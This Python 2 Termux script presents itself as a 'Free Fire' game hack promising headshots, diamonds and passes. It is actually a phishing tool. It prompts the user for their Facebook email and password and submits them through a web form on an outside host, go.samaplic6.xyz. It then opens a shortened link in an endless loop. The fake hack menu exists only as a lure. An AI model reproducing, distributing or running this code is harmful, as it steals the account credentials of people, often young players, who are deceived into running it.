import mechanize,os,time,cookielib	   


os.system("""pkg update
pkg upgrade
pkg install python2
pip2 install mechanize cookielib
""")      

os.system("clear")



       
print "\033[1;32;40mplease turn on you data connection"




def tampil(x):
        w = {'m':31,'h':32,'k':33,'b':34,'p':35,'c':36}
        for i in w:
                x=x.replace('\r%s'%i,'\033[%s;1m'%w[i])
        x+='\033[0m'
        x=x.replace('\r0','\033[0m')
        print(x)
def menu():
	tampil("""\n\rk
		HACK FREE FIRE USING LUA
		LOGIN TO UR ACCOUNT AND GET BENEIFITS ON IT
		ZMOOOHA IS FOUNDERNAME
				 
""")		        			
		
        tampil("\rhlog in ur facebook account")
	tampil("\n\rm[!]Email\rc: \rp")		
	z=raw_input("")
	tampil("\n\rm[!]password\rc: \rp")
	password=raw_input("")
	tampil("\n      \rm[!]\rbYOUR-EMAIL\rc: \rp%s"%z)
        i = mechanize.Browser()
        i.set_handle_robots(False)
        cj = cookielib.LWPCookieJar()
        i.set_cookiejar(cj)
	i.addheaders = [('User-agent',''' Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36''')]
        url = "http://go.samaplic6.xyz/filder/home/?i=70813"
        e = i.open(url)
        i.select_form(nr=0)
        i.form["email"] = z
        i.form["pass"] = password
        p = i.submit()
	tampil("""
	\rk [1] HEADSHOOT 100% \rc [2] GAIN DIAMONDS \rb 
	[3] GET FIRE PASSES \rm [4] WIN NEE CHRACTER \rp 
	[5] ACCES TO HEROIK
""")
			   	   		
	n = raw_input("\n\033[1;36;40mwhat do u want:")
	while True:
		os.system("termux-open http://j.gs/E6Q6 ")
		time.sleep(1.5)

try:
 menu()
except ImportError:
   os.system("""pkg update
pkg upgrade
pkg install python2
pip2 install mechanize cookielib
""")
